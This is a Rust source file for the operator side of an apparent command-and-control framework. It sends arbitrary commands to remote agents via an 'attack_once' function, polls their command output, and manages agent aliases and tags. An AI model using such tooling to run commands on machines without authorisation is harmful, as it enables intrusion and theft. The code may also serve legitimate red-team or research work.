//! HTTP client and C2 API operations.

use std::thread;
use std::time::Duration;

use anyhow::{anyhow, Result};
use reqwest::blocking::Client;
use uuid::Uuid;

use crate::types::{AgentInfo, ResultItem, TagsResponse};

pub fn attack_once(cli: &Client, base: &str, agent_id: &str, command: &str) -> Result<()> {
    let res = cli
        .post(format!("{base}/v1/command/{agent_id}"))
        .json(&serde_json::json!({ "command": command }))
        .send()?;
    let status = res.status();
    let text = res.text()?;
    if !status.is_success() {
        return Err(anyhow!("attack failed: status={} body={}", status, text));
    }
    println!("{}", text);
    Ok(())
}

pub fn fetch_tags(cli: &Client, base: &str, agent_id: &str) -> Result<Vec<String>> {
    let res = cli
        .get(format!("{base}/v1/admin/agents/{agent_id}/tags"))
        .send()?;
    let status = res.status();
    let text = res.text()?;
    if !status.is_success() {
        return Err(anyhow!("tags fetch failed: status={} body={}", status, text));
    }
    let resp: TagsResponse = serde_json::from_str(&text)
        .map_err(|e| anyhow!("parse tags failed: {e}; body={}", text))?;
    Ok(resp.tags)
}

pub fn update_tags(cli: &Client, base: &str, agent_id: &str, tags: &[String]) -> Result<()> {
    let res = cli
        .post(format!("{base}/v1/admin/agents/{agent_id}/tags"))
        .json(&serde_json::json!({ "tags": tags }))
        .send()?;
    let status = res.status();
    let text = res.text()?;
    if !status.is_success() {
        return Err(anyhow!("tags update failed: status={} body={}", status, text));
    }
    Ok(())
}

pub fn run_command_and_get_stdout(
    cli: &Client,
    base: &str,
    agent_id: &str,
    command: &str,
) -> Result<String> {
    let start_ms = chrono::Utc::now().timestamp_millis();
    attack_once(cli, base, agent_id, command)?;

    for _ in 0..30 {
        let res = cli
            .get(format!("{base}/v1/admin/results?agent_id={agent_id}&limit=5"))
            .send()?;
        let status = res.status();
        let text = res.text()?;
        if !status.is_success() {
            return Err(anyhow!("results fetch failed: status={} body={}", status, text));
        }
        let items: Vec<ResultItem> = serde_json::from_str(&text)
            .map_err(|e| anyhow!("parse results failed: {e}; body={}", text))?;
        if let Some(item) = items.into_iter().find(|r| r.ts_ms >= start_ms) {
            if !item.stdout.is_empty() {
                return Ok(item.stdout);
            } else {
                return Err(anyhow!(
                    "command returned empty stdout (stderr={})",
                    item.stderr
                ));
            }
        }
        thread::sleep(Duration::from_secs(2));
    }
    Err(anyhow!("timeout waiting for command result"))
}

pub fn resolve_agent_identifier(cli: &Client, base_url: &str, ident: &str) -> Result<String> {
    if Uuid::parse_str(ident).is_ok() {
        return Ok(ident.to_string());
    }

    let res = cli.get(format!("{base_url}/v1/admin/agents")).send()?;
    if !res.status().is_success() {
        return Err(anyhow!("failed to fetch agents: {}", res.status()));
    }
    let text = res.text()?;
    let agents: Vec<AgentInfo> = serde_json::from_str(&text)?;

    let mut matches = Vec::new();
    for item in agents {
        if item.alias.as_deref() == Some(ident) {
            matches.push(item.agent_id);
        }
    }

    match matches.len() {
        0 => Err(anyhow!("no agent with alias '{}'", ident)),
        1 => Ok(matches[0].clone()),
        _ => {
            eprintln!("alias '{}' is ambiguous; matching agent_ids:", ident);
            for id in &matches {
                eprintln!("  {}", id);
            }
            Err(anyhow!(
                "alias '{}' matches multiple agents; use agent_id explicitly",
                ident
            ))
        }
    }
}
